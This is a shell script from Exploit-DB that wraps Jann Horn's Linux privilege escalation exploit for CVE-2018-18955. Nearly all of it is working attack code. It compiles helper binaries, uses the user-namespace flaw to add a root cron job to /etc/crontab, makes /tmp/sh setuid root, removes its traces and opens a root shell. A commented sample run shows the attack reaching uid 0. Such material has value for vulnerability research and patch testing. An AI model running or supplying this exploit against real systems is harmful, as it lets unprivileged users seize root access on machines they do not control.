#!/bin/sh
#
# EDB Note: Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47164.zip
#
# wrapper for Jann Horn's exploit for CVE-2018-18955
# uses crontab technique
# ---
# test@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955$ ./exploit.cron.sh
# [*] Compiling...
# [*] Writing payload to /tmp/payload...
# [*] Adding cron job... (wait a minute)
# [.] starting
# [.] setting up namespace
# [~] done, namespace sandbox set up
# [.] mapping subordinate ids
# [.] subuid: 165536
# [.] subgid: 165536
# [~] done, mapped subordinate ids
# [.] executing subshell
# [+] Success:
# -rwsrwxr-x 1 root root 8384 Nov 21 19:47 /tmp/sh
# [*] Cleaning up...
# [!] Remember to clean up /etc/crontab
# [*] Launching root shell: /tmp/sh
# root@linux-mint-19-2:~/kernel-exploits/CVE-2018-18955# id
# uid=0(root) gid=0(root) groups=0(root),1001(test)

rootshell="/tmp/sh"
bootstrap="/tmp/payload"

command_exists() {
  command -v "${1}" >/dev/null 2>/dev/null
}

if ! command_exists gcc; then
  echo '[-] gcc is not installed'
  exit 1
fi

if ! command_exists /usr/bin/newuidmap; then
  echo '[-] newuidmap is not installed'
  exit 1
fi

if ! command_exists /usr/bin/newgidmap; then
  echo '[-] newgidmap is not installed'
  exit 1
fi

if ! test -w .; then
  echo '[-] working directory is not writable'
  exit 1
fi

echo "[*] Compiling..."

if ! gcc subuid_shell.c -o subuid_shell; then
  echo 'Compiling subuid_shell.c failed'
  exit 1
fi

if ! gcc subshell.c -o subshell; then
  echo 'Compiling gcc_subshell.c failed'
  exit 1
fi

if ! gcc rootshell.c -o "${rootshell}"; then
  echo 'Compiling rootshell.c failed'
  exit 1
fi

echo "[*] Writing payload to ${bootstrap}..."

echo "#!/bin/sh\n/bin/chown root:root ${rootshell};/bin/chmod u+s ${rootshell}" > $bootstrap
/bin/chmod +x "${bootstrap}"

echo "[*] Adding cron job... (wait a minute)"

echo "echo '* * * * * root ${bootstrap}' >> /etc/crontab" | ./subuid_shell ./subshell
sleep 60

if ! test -u "${rootshell}"; then
  echo '[-] Failed'
  /bin/rm "${rootshell}"
  /bin/rm "${bootstrap}"
  exit 1
fi

echo '[+] Success:'
ls -la "${rootshell}"

echo '[*] Cleaning up...'
/bin/rm "${bootstrap}"
/bin/rm subuid_shell
/bin/rm subshell
if command_exists /bin/sed; then
  echo "/bin/sed -i '\$ d' /etc/crontab" | $rootshell
else
  echo "[!] Manual clean up of /etc/crontab required"
fi

echo "[*] Launching root shell: ${rootshell}"
$rootshell